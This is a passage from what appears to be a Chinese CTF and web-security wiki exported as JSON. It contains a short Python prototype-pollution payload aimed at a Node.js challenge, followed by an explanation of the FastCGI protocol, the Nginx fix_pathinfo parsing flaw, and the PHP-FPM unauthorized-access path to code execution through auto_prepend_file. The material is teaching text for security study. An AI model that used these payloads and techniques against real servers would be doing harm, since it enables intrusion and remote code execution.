req.body.userid;\nlet key = req.body.key;\nconsole.log(userid);\nconsole.log(key);//\u5728\u63a7\u5236\u53f0\u4e0a\u8f93\u51fa\u4fe1\u606f\nif (Super[userid] === key) {\nres.send(\n\"admin!\\nyou can goto ***** endpoint to hack!\"\n);\n} else {\nres.send(\"You are not the Super, so I cannot give you the truth.\");\n}\n}\n});\napp.all(\"/\", (req, res) =&gt; {\nlet data = { userid: [], key: [] };\nconsole.log(data);\nconsole.log(req.body);\nif (req.method == \"POST\" &amp;&amp; req.body) {\ndata = mixme.merge(data, req.body);\nreq.session.data = data;\n// console.log(\"After MERGE: \" + Super[\"test\"]);\n}\nres.send(\"to be admin and you will find it!\");\n});\napp.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`));\n</code></pre> Plain Text <pre><code>\u8fd9\u5c31\u662f\u90a3\u5929\u7684\u6e90\u7801\n\n\n\u7b2c66\u884c\u6709\u4e2amerge\u5408\u5e76\u51fd\u6570\n\n\n51\u884c\u6709\u4e2a\u6bd4\u8f83\u7ed5\u8fc7\n\n\n\u6211\u4eec\u901a\u8fc7\u539f\u578b\u94fe\u7684\u6c61\u67d3\u6765\u8fc7\n\n\n\u4ee3\u7801\u903b\u8f91\u4e0d\u662f\u5f88\u96be\n\n\n\u6240\u4ee5\u6700\u7ec8\u6211\u4eec\u53ea\u9700\u8981\u4f20\u53c2\u5c31ok\u3002\u540e\u53f0\u4f30\u8ba1\u662f\u6709\u4e1c\u897f\u662f\u4e00\u76f4\u5728\u5220\u9664\uff0c\u6240\u4ee5\u6700\u597d\u6574\u4e2a\u811a\u672c\u3002\n\n\n```plain\nimport requests\nimport time\nurl1='127.0.0.1'\nurl2='127.0.0.1/getinfo'\npost_data1='{\"__proto__\":{\"a\":\"b\"}}'\npost_data2='{\"userid\":\"a\",\"key\":\"b\"}'\nheaders = {\n\"Content-Type\":\"application/json\"\n}\nreqs1=requests.post(url1,data=post_data1,headers=headers)\nprint(reqs1.text)\ntime.sleep(0.5)\nreqs2=requests.post(url2,data=post_data2,headers=headers)\nprint(reqs2.text)\nPlain Text\n</code></pre></p> <p>\uff08\u6211\u6ca1\u7528\u8fc7\u4f46\u5e94\u8be5\u5c31\u8fd9\u6837\u5427...\uff09</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/","title":"PHP-FPM\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>Fastcgi\u5176\u5b9e\u662f\u4e00\u4e2a\u901a\u4fe1\u534f\u8bae\uff0c\u548cHTTP\u534f\u8bae\u4e00\u6837\uff0c\u90fd\u662f\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u7684\u4e00\u4e2a\u901a\u9053\u3002</p> <p>HTTP\u534f\u8bae\u662f\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u7684\u534f\u8bae\uff0c\u6d4f\u89c8\u5668\u5c06HTTP\u5934\u548cHTTP\u4f53\u7528\u67d0\u4e2a\u89c4\u5219\u7ec4\u88c5\u6210\u6570\u636e\u5305\uff0c\u4ee5TCP\u7684\u65b9\u5f0f\u53d1\u9001\u5230\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\uff0c\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u6309\u7167\u89c4\u5219\u5c06\u6570\u636e\u5305\u89e3\u7801\uff0c\u5e76\u6309\u8981\u6c42\u62ff\u5230\u7528\u6237\u9700\u8981\u7684\u6570\u636e\uff0c\u518d\u4ee5HTTP\u534f\u8bae\u7684\u89c4\u5219\u6253\u5305\u8fd4\u56de\u7ed9\u670d\u52a1\u5668\u3002</p> <p>\u7c7b\u6bd4HTTP\u534f\u8bae\u6765\u8bf4\uff0cfastcgi\u534f\u8bae\u5219\u662f\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u548c\u67d0\u4e2a\u8bed\u8a00\u540e\u7aef\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u7684\u534f\u8bae\u3002Fastcgi\u534f\u8bae\u7531\u591a\u4e2arecord\u7ec4\u6210\uff0crecord\u4e5f\u6709header\u548cbody\u4e00\u8bf4\uff0c\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u5c06\u8fd9\u4e8c\u8005\u6309\u7167fastcgi\u7684\u89c4\u5219\u5c01\u88c5\u597d\u53d1\u9001\u7ed9\u8bed\u8a00\u540e\u7aef\uff0c\u8bed\u8a00\u540e\u7aef\u89e3\u7801\u4ee5\u540e\u62ff\u5230\u5177\u4f53\u6570\u636e\uff0c\u8fdb\u884c\u6307\u5b9a\u64cd\u4f5c\uff0c\u5e76\u5c06\u7ed3\u679c\u518d\u6309\u7167\u8be5\u534f\u8bae\u5c01\u88c5\u597d\u540e\u8fd4\u56de\u7ed9\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u3002</p> <p>\u548cHTTP\u5934\u4e0d\u540c\uff0crecord\u7684\u5934\u56fa\u5b9a8\u4e2a\u5b57\u8282\uff0cbody\u662f\u7531\u5934\u4e2d\u7684contentLength\u6307\u5b9a\uff0c\u5176\u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>typedef struct {\n/* Header */\nunsigned char version; // \u7248\u672c\nunsigned char type; // \u672c\u6b21record\u7684\u7c7b\u578b\nunsigned char requestIdB1; // \u672c\u6b21record\u5bf9\u5e94\u7684\u8bf7\u6c42id\nunsigned char requestIdB0;\nunsigned char contentLengthB1; // body\u4f53\u7684\u5927\u5c0f\nunsigned char contentLengthB0;\nunsigned char paddingLength; // \u989d\u5916\u5757\u5927\u5c0f\nunsigned char reserved;\n\n/* Body */\nunsigned char contentData[contentLength];\nunsigned char paddingData[paddingLength];\n} FCGI_Record;\n</code></pre> <p>\u5934\u75318\u4e2auchar\u7c7b\u578b\u7684\u53d8\u91cf\u7ec4\u6210\uff0c\u6bcf\u4e2a\u53d8\u91cf1\u5b57\u8282\u3002\u5176\u4e2d\uff0c<code>requestId</code>\u5360\u4e24\u4e2a\u5b57\u8282\uff0c\u4e00\u4e2a\u552f\u4e00\u7684\u6807\u5fd7id\uff0c\u4ee5\u907f\u514d\u591a\u4e2a\u8bf7\u6c42\u4e4b\u95f4\u7684\u5f71\u54cd\uff1b<code>contentLength</code>\u5360\u4e24\u4e2a\u5b57\u8282\uff0c\u8868\u793abody\u7684\u5927\u5c0f\u3002</p> <p>\u8bed\u8a00\u7aef\u89e3\u6790\u4e86fastcgi\u5934\u4ee5\u540e\uff0c\u62ff\u5230<code>contentLength</code>\uff0c\u7136\u540e\u518d\u5728TCP\u6d41\u91cc\u8bfb\u53d6\u5927\u5c0f\u7b49\u4e8e<code>contentLength</code>\u7684\u6570\u636e\uff0c\u8fd9\u5c31\u662fbody\u4f53\u3002</p> <p>Body\u540e\u9762\u8fd8\u6709\u4e00\u6bb5\u989d\u5916\u7684\u6570\u636e\uff08Padding\uff09\uff0c\u5176\u957f\u5ea6\u7531\u5934\u4e2d\u7684paddingLength\u6307\u5b9a\uff0c\u8d77\u4fdd\u7559\u4f5c\u7528\u3002\u4e0d\u9700\u8981\u8be5Padding\u7684\u65f6\u5019\uff0c\u5c06\u5176\u957f\u5ea6\u8bbe\u7f6e\u4e3a0\u5373\u53ef\u3002</p> <p>\u53ef\u89c1\uff0c\u4e00\u4e2afastcgi record\u7ed3\u6784\u6700\u5927\u652f\u6301\u7684body\u5927\u5c0f\u662f<code>2^16</code>\uff0c\u4e5f\u5c31\u662f65536\u5b57\u8282\u3002</p> <p><code>type</code>\u5c31\u662f\u6307\u5b9a\u8be5record\u7684\u4f5c\u7528\u3002\u56e0\u4e3afastcgi\u4e00\u4e2arecord\u7684\u5927\u5c0f\u662f\u6709\u9650\u7684\uff0c\u4f5c\u7528\u4e5f\u662f\u5355\u4e00\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5728\u4e00\u4e2aTCP\u6d41\u91cc\u4f20\u8f93\u591a\u4e2arecord\u3002\u901a\u8fc7<code>type</code>\u6765\u6807\u5fd7\u6bcf\u4e2arecord\u7684\u4f5c\u7528\uff0c\u7528<code>requestId</code>\u4f5c\u4e3a\u540c\u4e00\u6b21\u8bf7\u6c42\u7684id\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\uff0c\u6bcf\u6b21\u8bf7\u6c42\uff0c\u4f1a\u6709\u591a\u4e2arecord\uff0c\u4ed6\u4eec\u7684<code>requestId</code>\u662f\u76f8\u540c\u7684\u3002</p> <p>\u5217\u51fa\u6700\u4e3b\u8981\u7684\u51e0\u79cd<code>type</code>\uff1a</p> <p></p> <p>\u770b\u4e86\u8fd9\u4e2a\u8868\u683c\u5c31\u5f88\u6e05\u695a\u4e86\uff0c\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u548c\u540e\u7aef\u8bed\u8a00\u901a\u4fe1\uff0c\u7b2c\u4e00\u4e2a\u6570\u636e\u5305\u5c31\u662f<code>type</code>\u4e3a1\u7684record\uff0c\u540e\u7eed\u4e92\u76f8\u4ea4\u6d41\uff0c\u53d1\u9001<code>type</code>\u4e3a4\u30015\u30016\u30017\u7684record\uff0c\u7ed3\u675f\u65f6\u53d1\u9001<code>type</code>\u4e3a2\u30013\u7684record\u3002\u5f53\u540e\u7aef\u8bed\u8a00\u63a5\u6536\u5230\u4e00\u4e2a<code>type</code>\u4e3a4\u7684record\u540e\uff0c\u5c31\u4f1a\u628a\u8fd9\u4e2arecord\u7684body\u6309\u7167\u5bf9\u5e94\u7684\u7ed3\u6784\u89e3\u6790\u6210key-value\u5bf9\uff0c\u8fd9\u5c31\u662f\u73af\u5883\u53d8\u91cf\u3002\u73af\u5883\u53d8\u91cf\u7684\u7ed3\u6784\u5982\u4e0b\uff1a</p> <pre><code>typedef struct {\nunsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */\nunsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */\nunsigned char nameData[nameLength];\nunsigned char valueData[valueLength];\n} FCGI_NameValuePair11;\n\ntypedef struct {\nunsigned char nameLengthB0;  /* nameLengthB0  &gt;&gt; 7 == 0 */\nunsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */\nunsigned char valueLengthB2;\nunsigned char valueLengthB1;\nunsigned char valueLengthB0;\nunsigned char nameData[nameLength];\nunsigned char valueData[valueLength\n((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];\n} FCGI_NameValuePair14;\n\ntypedef struct {\nunsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */\nunsigned char nameLengthB2;\nunsigned char nameLengthB1;\nunsigned char nameLengthB0;\nunsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */\nunsigned char nameData[nameLength\n((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];\nunsigned char valueData[valueLength];\n} FCGI_NameValuePair41;\n\ntypedef struct {\nunsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */\nunsigned char nameLengthB2;\nunsigned char nameLengthB1;\nunsigned char nameLengthB0;\nunsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */\nunsigned char valueLengthB2;\nunsigned char valueLengthB1;\nunsigned char valueLengthB0;\nunsigned char nameData[nameLength\n((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];\nunsigned char valueData[valueLength\n((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];\n} FCGI_NameValuePair44;\n</code></pre> <p>\u8fd9\u5176\u5b9e\u662f4\u4e2a\u7ed3\u6784\uff0c\u81f3\u4e8e\u7528\u54ea\u4e2a\u7ed3\u6784\uff0c\u6709\u5982\u4e0b\u89c4\u5219\uff1a</p> <ol> <li>key\u3001value\u5747\u5c0f\u4e8e128\u5b57\u8282\uff0c\u7528<code>FCGI_NameValuePair11</code></li> <li>key\u5927\u4e8e128\u5b57\u8282\uff0cvalue\u5c0f\u4e8e128\u5b57\u8282\uff0c\u7528<code>FCGI_NameValuePair41</code></li> <li>key\u5c0f\u4e8e128\u5b57\u8282\uff0cvalue\u5927\u4e8e128\u5b57\u8282\uff0c\u7528<code>FCGI_NameValuePair14</code></li> <li>key\u3001value\u5747\u5927\u4e8e128\u5b57\u8282\uff0c\u7528<code>FCGI_NameValuePair44</code></li> </ol> <p>\u4e3a\u4ec0\u4e48\u6211\u53ea\u4ecb\u7ecd<code>type</code>\u4e3a4\u7684record\uff1f\u56e0\u4e3a\u73af\u5883\u53d8\u91cf\u5728\u540e\u9762PHP-FPM\u91cc\u6709\u91cd\u8981\u4f5c\u7528\uff0c\u4e4b\u540e\u5199\u4ee3\u7801\u4e5f\u4f1a\u5199\u5230\u8fd9\u4e2a\u7ed3\u6784\u3002<code>type</code>\u7684\u5176\u4ed6\u60c5\u51b5\uff0c\u5927\u5bb6\u53ef\u4ee5\u81ea\u5df1\u7ffb\u6587\u6863\u7406\u89e3\u7406\u89e3\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#php-fpm_1","title":"PHP-FPM","text":"<p>FPM\u5176\u5b9e\u662f\u4e00\u4e2afastcgi\u534f\u8bae\u89e3\u6790\u5668\uff0cNginx\u7b49\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u5c06\u7528\u6237\u8bf7\u6c42\u6309\u7167fastcgi\u7684\u89c4\u5219\u6253\u5305\u597d\u901a\u8fc7TCP\u4f20\u7ed9\u8c01\uff1f\u5176\u5b9e\u5c31\u662f\u4f20\u7ed9FPM\u3002</p> <p>FPM\u6309\u7167fastcgi\u7684\u534f\u8bae\u5c06TCP\u6d41\u89e3\u6790\u6210\u771f\u6b63\u7684\u6570\u636e\u3002</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u7528\u6237\u8bbf\u95ee<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>\uff0c\u5982\u679cweb\u76ee\u5f55\u662f<code>/var/www/html</code>\uff0c\u90a3\u4e48Nginx\u4f1a\u5c06\u8fd9\u4e2a\u8bf7\u6c42\u53d8\u6210\u5982\u4e0bkey-value\u5bf9\uff1a</p> <pre><code>{\n'GATEWAY_INTERFACE': 'FastCGI/1.0',\n'REQUEST_METHOD': 'GET',\n'SCRIPT_FILENAME': '/var/www/html/index.php',\n'SCRIPT_NAME': '/index.php',\n'QUERY_STRING': '?a=1&amp;b=2',\n'REQUEST_URI': '/index.php?a=1&amp;b=2',\n'DOCUMENT_ROOT': '/var/www/html',\n'SERVER_SOFTWARE': 'php/fcgiclient',\n'REMOTE_ADDR': '127.0.0.1',\n'REMOTE_PORT': '12345',\n'SERVER_ADDR': '127.0.0.1',\n'SERVER_PORT': '80',\n'SERVER_NAME': \"localhost\",\n'SERVER_PROTOCOL': 'HTTP/1.1'\n}\n</code></pre> <p>\u8fd9\u4e2a\u6570\u7ec4\u5176\u5b9e\u5c31\u662fPHP\u4e2d<code>$_SERVER</code>\u6570\u7ec4\u7684\u4e00\u90e8\u5206\uff0c\u4e5f\u5c31\u662fPHP\u91cc\u7684\u73af\u5883\u53d8\u91cf\u3002\u4f46\u73af\u5883\u53d8\u91cf\u7684\u4f5c\u7528\u4e0d\u4ec5\u662f\u586b\u5145<code>$_SERVER</code>\u6570\u7ec4\uff0c\u4e5f\u662f\u544a\u8bc9fpm\uff1a\u201c\u6211\u8981\u6267\u884c\u54ea\u4e2aPHP\u6587\u4ef6\u201d\u3002</p> <p>PHP-FPM\u62ff\u5230fastcgi\u7684\u6570\u636e\u5305\u540e\uff0c\u8fdb\u884c\u89e3\u6790\uff0c\u5f97\u5230\u4e0a\u8ff0\u8fd9\u4e9b\u73af\u5883\u53d8\u91cf\u3002\u7136\u540e\uff0c\u6267\u884c<code>SCRIPT_FILENAME</code>\u7684\u503c\u6307\u5411\u7684PHP\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f<code>/var/www/html/index.php</code>\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#nginxiis7","title":"Nginx\uff08IIS7\uff09\u89e3\u6790\u6f0f\u6d1e","text":"<p>Nginx\u548cIIS7\u66fe\u7ecf\u51fa\u73b0\u8fc7\u4e00\u4e2aPHP\u76f8\u5173\u7684\u89e3\u6790\u6f0f\u6d1e\uff08\u6d4b\u8bd5\u73af\u5883<code>https://github.com/phith0n/vulhub/tree/master/nginx_parsing_vulnerability</code>\uff09\uff0c\u8be5\u6f0f\u6d1e\u73b0\u8c61\u662f\uff0c\u5728\u7528\u6237\u8bbf\u95ee<code>http://127.0.0.1/favicon.ico/.php</code>\u65f6\uff0c\u8bbf\u95ee\u5230\u7684\u6587\u4ef6\u662ffavicon.ico\uff0c\u4f46\u5374\u6309\u7167.php\u540e\u7f00\u89e3\u6790\u4e86\u3002</p> <p>\u7528\u6237\u8bf7\u6c42<code>http://127.0.0.1/favicon.ico/.php</code>\uff0cnginx\u5c06\u4f1a\u53d1\u9001\u5982\u4e0b\u73af\u5883\u53d8\u91cf\u5230fpm\u91cc\uff1a</p> <pre><code>{\n...\n'SCRIPT_FILENAME': '/var/www/html/favicon.ico/.php',\n'SCRIPT_NAME': '/favicon.ico/.php',\n'REQUEST_URI': '/favicon.ico/.php',\n'DOCUMENT_ROOT': '/var/www/html',\n...\n}\n</code></pre> <p>\u6b63\u5e38\u6765\u8bf4\uff0c<code>SCRIPT_FILENAME</code>\u7684\u503c\u662f\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6587\u4ef6<code>/var/www/html/favicon.ico/.php</code>\uff0c\u662fPHP\u8bbe\u7f6e\u4e2d\u7684\u4e00\u4e2a\u9009\u9879<code>fix_pathinfo</code>\u5bfc\u81f4\u4e86\u8fd9\u4e2a\u6f0f\u6d1e\u3002PHP\u4e3a\u4e86\u652f\u6301Path Info\u6a21\u5f0f\u800c\u521b\u9020\u4e86<code>fix_pathinfo</code>\uff0c\u5728\u8fd9\u4e2a\u9009\u9879\u88ab\u6253\u5f00\u7684\u60c5\u51b5\u4e0b\uff0cfpm\u4f1a\u5224\u65ad<code>SCRIPT_FILENAME</code>\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u5219\u53bb\u6389\u6700\u540e\u4e00\u4e2a<code>/</code>\u53ca\u4ee5\u540e\u7684\u6240\u6709\u5185\u5bb9\uff0c\u518d\u6b21\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c\u5f80\u6b21\u5faa\u73af\uff0c\u76f4\u5230\u6587\u4ef6\u5b58\u5728\u3002</p> <p>\u6240\u4ee5\uff0c\u7b2c\u4e00\u6b21fpm\u53d1\u73b0<code>/var/www/html/favicon.ico/.php</code>\u4e0d\u5b58\u5728\uff0c\u5219\u53bb\u6389<code>/.php</code>\uff0c\u518d\u5224\u65ad<code>/var/www/html/favicon.ico</code>\u662f\u5426\u5b58\u5728\u3002\u663e\u7136\u8fd9\u4e2a\u6587\u4ef6\u662f\u5b58\u5728\u7684\uff0c\u4e8e\u662f\u88ab\u4f5c\u4e3aPHP\u6587\u4ef6\u6267\u884c\uff0c\u5bfc\u81f4\u89e3\u6790\u6f0f\u6d1e\u3002</p> <p>\u6b63\u786e\u7684\u89e3\u51b3\u65b9\u6cd5\u6709\u4e24\u79cd\uff0c\u4e00\u662f\u5728Nginx\u7aef\u4f7f\u7528<code>fastcgi_split_path_info</code>\u5c06path info\u4fe1\u606f\u53bb\u9664\u540e\uff0c\u7528tryfiles\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff1b\u4e8c\u662f\u501f\u52a9PHP-FPM\u7684<code>security.limit_extensions</code>\u914d\u7f6e\u9879\uff0c\u907f\u514d\u5176\u4ed6\u540e\u7f00\u6587\u4ef6\u88ab\u89e3\u6790\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#securitylimit_extensions","title":"<code>security.limit_extensions</code>\u914d\u7f6e","text":"<p>\u5199\u5230\u8fd9\u91cc\uff0cPHP-FPM\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u4e5f\u5c31\u547c\u4e4b\u6b32\u51fa\u4e86\u3002PHP-FPM\u9ed8\u8ba4\u76d1\u542c9000\u7aef\u53e3\uff0c\u5982\u679c\u8fd9\u4e2a\u7aef\u53e3\u66b4\u9732\u5728\u516c\u7f51\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u6784\u9020fastcgi\u534f\u8bae\uff0c\u548cfpm\u8fdb\u884c\u901a\u4fe1\u3002</p> <p>\u6b64\u65f6\uff0c<code>SCRIPT_FILENAME</code>\u7684\u503c\u5c31\u683c\u5916\u91cd\u8981\u4e86\u3002\u56e0\u4e3afpm\u662f\u6839\u636e\u8fd9\u4e2a\u503c\u6765\u6267\u884cphp\u6587\u4ef6\u7684\uff0c\u5982\u679c\u8fd9\u4e2a\u6587\u4ef6\u4e0d\u5b58\u5728\uff0cfpm\u4f1a\u76f4\u63a5\u8fd4\u56de404\uff1a</p> <p></p> <p>\u5728fpm\u67d0\u4e2a\u7248\u672c\u4e4b\u524d\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06<code>SCRIPT_FILENAME</code>\u7684\u503c\u6307\u5b9a\u4e3a\u4efb\u610f\u540e\u7f00\u6587\u4ef6\uff0c\u6bd4\u5982<code>/etc/passwd</code>\uff1b\u4f46\u540e\u6765\uff0cfpm\u7684\u9ed8\u8ba4\u914d\u7f6e\u4e2d\u589e\u52a0\u4e86\u4e00\u4e2a\u9009\u9879<code>security.limit_extensions</code>\uff1a</p> <pre><code>; Limits the extensions of the main script FPM will allow to parse. This can\n; prevent configuration mistakes on the web server side. You should only limit\n; FPM to .php extensions to prevent malicious users to use other extensions to\n; exectute php code.\n; Note: set an empty value to allow all extensions.\n; Default Value: .php\n;security.limit_extensions = .php .php3 .php4 .php5 .php7\n</code></pre> <p>\u5176\u9650\u5b9a\u4e86\u53ea\u6709\u67d0\u4e9b\u540e\u7f00\u7684\u6587\u4ef6\u5141\u8bb8\u88abfpm\u6267\u884c\uff0c\u9ed8\u8ba4\u662f<code>.php</code>\u3002\u6240\u4ee5\uff0c\u5f53\u6211\u4eec\u518d\u4f20\u5165<code>/etc/passwd</code>\u7684\u65f6\u5019\uff0c\u5c06\u4f1a\u8fd4\u56de<code>Access denied.</code>\uff1a</p> <p></p> <p>ps. \u8fd9\u4e2a\u914d\u7f6e\u4e5f\u4f1a\u5f71\u54cdNginx\u89e3\u6790\u6f0f\u6d1e\uff0c\u6211\u89c9\u5f97\u5e94\u8be5\u662f\u56e0\u4e3aNginx\u5f53\u65f6\u90a3\u4e2a\u89e3\u6790\u6f0f\u6d1e\uff0c\u4fc3\u6210PHP-FPM\u589e\u52a0\u4e86\u8fd9\u4e2a\u5b89\u5168\u9009\u9879\u3002\u53e6\u5916\uff0c\u4e5f\u6709\u5c11\u90e8\u5206\u53d1\u884c\u7248\u5b89\u88c5\u4e2d<code>security.limit_extensions</code>\u9ed8\u8ba4\u4e3a\u7a7a\uff0c\u6b64\u65f6\u5c31\u6ca1\u6709\u4efb\u4f55\u9650\u5236\u4e86\u3002</p> <p>\u7531\u4e8e\u8fd9\u4e2a\u914d\u7f6e\u9879\u7684\u9650\u5236\uff0c\u5982\u679c\u60f3\u5229\u7528PHP-FPM\u7684\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u9996\u5148\u5c31\u5f97\u627e\u5230\u4e00\u4e2a\u5df2\u5b58\u5728\u7684PHP\u6587\u4ef6\u3002</p> <p>\u4e07\u5e78\u7684\u662f\uff0c\u901a\u5e38\u4f7f\u7528\u6e90\u5b89\u88c5php\u7684\u65f6\u5019\uff0c\u670d\u52a1\u5668\u4e0a\u90fd\u4f1a\u9644\u5e26\u4e00\u4e9bphp\u540e\u7f00\u7684\u6587\u4ef6\uff0c\u6211\u4eec\u4f7f\u7528<code>find / -name \"*.php\"</code>\u6765\u5168\u5c40\u641c\u7d22\u4e00\u4e0b\u9ed8\u8ba4\u73af\u5883\uff1a</p> <p></p> <p>\u627e\u5230\u4e86\u4e0d\u5c11\u3002\u8fd9\u5c31\u7ed9\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u6761\u601d\u8def\uff0c\u5047\u8bbe\u6211\u4eec\u7206\u7834\u4e0d\u51fa\u6765\u76ee\u6807\u73af\u5883\u7684web\u76ee\u5f55\uff0c\u6211\u4eec\u53ef\u4ee5\u627e\u627e\u9ed8\u8ba4\u6e90\u5b89\u88c5\u540e\u53ef\u80fd\u5b58\u5728\u7684php\u6587\u4ef6\uff0c\u6bd4\u5982<code>/usr/local/lib/php/PEAR.php</code>\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_1","title":"\u4efb\u610f\u4ee3\u7801\u6267\u884c","text":"<p>\u90a3\u4e48\uff0c\u4e3a\u4ec0\u4e48\u6211\u4eec\u63a7\u5236fastcgi\u534f\u8bae\u901a\u4fe1\u7684\u5185\u5bb9\uff0c\u5c31\u80fd\u6267\u884c\u4efb\u610fPHP\u4ee3\u7801\u5462\uff1f</p> <p>\u7406\u8bba\u4e0a\u5f53\u7136\u662f\u4e0d\u53ef\u4ee5\u7684\uff0c\u5373\u4f7f\u6211\u4eec\u80fd\u63a7\u5236<code>SCRIPT_FILENAME</code>\uff0c\u8ba9fpm\u6267\u884c\u4efb\u610f\u6587\u4ef6\uff0c\u4e5f\u53ea\u662f\u6267\u884c\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\uff0c\u5e76\u4e0d\u80fd\u6267\u884c\u6211\u4eec\u9700\u8981\u5176\u6267\u884c\u7684\u6587\u4ef6\u3002</p> <p>\u4f46PHP\u662f\u4e00\u95e8\u5f3a\u5927\u7684\u8bed\u8a00\uff0cPHP.INI\u4e2d\u6709\u4e24\u4e2a\u6709\u8da3\u7684\u914d\u7f6e\u9879\uff0c<code>auto_prepend_file</code>\u548c<code>auto_append_file</code>\u3002</p> <p><code>auto_prepend_file</code>\u662f\u544a\u8bc9PHP\uff0c\u5728\u6267\u884c\u76ee\u6807\u6587\u4ef6\u4e4b\u524d\uff0c\u5148\u5305\u542b<code>auto_prepend_file</code>\u4e2d\u6307\u5b9a\u7684\u6587\u4ef6\uff1b<code>auto_append_file</code>\u662f\u544a\u8bc9PHP\uff0c\u5728\u6267\u884c\u5b8c\u6210\u76ee\u6807\u6587\u4ef6\u540e\uff0c\u5305\u542b<code>auto_append_file</code>\u6307\u5411\u7684\u6587\u4ef6\u3002</p> <p>\u90a3\u4e48\u5c31\u6709\u8da3\u4e86\uff0c\u5047\u8bbe\u6211\u4eec\u8bbe\u7f6e<code>auto_prepend_file</code>\u4e3a<code>php://input</code>\uff0c\u90a3\u4e48\u5c31\u7b49\u4e8e\u5728\u6267\u884c\u4efb\u4f55php\u6587\u4ef6\u524d\u90fd\u8981\u5305\u542b\u4e00\u904dPOST\u7684\u5185\u5bb9\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u53ea\u9700\u8981\u628a\u5f85\u6267\u884c\u7684\u4ee3\u7801\u653e\u5728Body\u4e2d\uff0c\u4ed6\u4eec\u5c31\u80fd\u88ab\u6267\u884c\u4e86\u3002\uff08\u5f53\u7136\uff0c\u8fd8\u9700\u8981\u5f00\u542f\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u9009\u9879<code>allow_url_include</code>\uff09</p> <p>\u90a3\u4e48\uff0c\u6211\u4eec\u600e\u4e48\u8bbe\u7f6e<code>auto_prepend_file</code>\u7684\u503c\uff1f</p> 